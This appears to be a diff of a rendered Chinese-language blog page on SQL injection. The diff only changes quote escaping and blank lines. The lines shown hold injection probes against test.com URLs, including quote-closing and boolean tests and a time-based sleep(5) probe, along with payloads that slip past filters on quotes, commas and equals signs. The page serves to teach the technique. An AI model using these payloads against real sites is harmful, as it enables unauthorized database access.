@@ -116,20 +116,18 @@ var _hmt = _hmt || [];
 http://www.test.com/test.php?id<span class="o">=</span><span class="m">8</span><span class="w"> </span>and<span class="w"> </span><span class="nv">1</span><span class="o">=</span><span class="m">2</span>
 <span class="k">select</span><span class="w"> </span>*<span class="w"> </span>from<span class="w"> </span>table<span class="w"> </span>where<span class="w"> </span><span class="nv">id</span><span class="o">=</span><span class="m">8</span><span class="w"> </span>and<span class="w"> </span><span class="nv">1</span><span class="o">=</span><span class="m">2</span>
 </code></pre></div>
-
 <p>看看加上 and 1=2 是否正常，如果出现异常，可能出现SQL注入漏洞</p>
 <h4>字符型注入</h4>
 <p>http://www.test.com/test.php?user=njcx</p>
 <p>select * from table where user='njcx'</p>
 <p>字符型注入跟数字型注入的区别在字符型注入需要闭合,参数变了，"njcx' and 1=1--"</p>
 <p>当然，也可以出现双闭合</p>
-<div class="highlight"><pre><span></span><code>http://www.test.com/test.php?user<span class="o">=</span>njcx<span class="s1">&#39; and 1=1-- </span>
-<span class="s1">select * from table where user=&#39;</span>njcx<span class="s1">&#39; and 1=1--&#39;</span>
+<div class="highlight"><pre><span></span><code>http://www.test.com/test.php?user<span class="o">=</span>njcx<span class="s1">' and 1=1-- </span>
+<span class="s1">select * from table where user='</span>njcx<span class="s1">' and 1=1--'</span>
 
-http://www.test.com/test.php?user<span class="o">=</span>njcx<span class="s1">&#39; and 1=2-- </span>
-<span class="s1">select * from table where user=&#39;</span>njcx<span class="s1">&#39; and 1=2--&#39;</span>
+http://www.test.com/test.php?user<span class="o">=</span>njcx<span class="s1">' and 1=2-- </span>
+<span class="s1">select * from table where user='</span>njcx<span class="s1">' and 1=2--'</span>
 </code></pre></div>
-
 <p>看看加上 and 1=2 是否正常，如果出现异常，可能出现SQL注入漏洞，</p>
 <h4>注入方式</h4>
 <p>SQL注入的分类</p>
@@ -181,10 +179,9 @@ http://www.test.com/test.php?user<span class="o">=</span>njcx<span class="s1">&#
 特殊函数中的空格绕过:ascii(mid(xxfrom(1))) ascii(substr(xxfrom(1)))
 <span class="k">-</span> 对单引号的绕过:
 
- 十六进制绕过(针对需要输入表名的时候 &#39;user&#39;=&gt;0x7573657273)
+ 十六进制绕过(针对需要输入表名的时候 'user'=&gt;0x7573657273)
  substr(x,1,1),mid(x,1,1)=&gt;substr(x from 1 for 1) mid(x from 1 for 1)
 </code></pre></div>
-
 </li>
 <li>
 <p>对逗号的绕过：</p>
@@ -198,13 +195,12 @@ union select * from (select 1)a join (select 2)b
 
 select case when (条件) then (代码1) else (代码2) end 可以对应上if(条件,代码1,代码2)
 
-if(substring((select user()) from 1 for 1)=&#39;e&#39;,sleep(5),1)
+if(substring((select user()) from 1 for 1)='e',sleep(5),1)
 
 可以变为
 
-select case when substring((select user()) from 1 for 1)=&#39;e&#39; then sleep(5) else 1 end
+select case when substring((select user()) from 1 for 1)='e' then sleep(5) else 1 end
 </code></pre></div>
-
 </li>
 <li>
 <p>等号的绕过:</p>
@@ -214,13 +210,12 @@ select case when substring((select user()) from 1 for 1)=&#39;e&#39; then sleep(
 
 利用greatest()绕过(greatest(a,b)返回较大的那个数)
 
-?id=&#39; or 1 like 1
+?id=' or 1 like 1
 
-?id=&#39; or 1 &lt;&gt; 1
+?id=' or 1 &lt;&gt; 1
 
-?id=&#39; union select greatest(substr((select user()),1,1),95)
+?id=' union select greatest(substr((select user()),1,1),95)
 </code></pre></div>
-
 </li>
 </ul>
 </li>
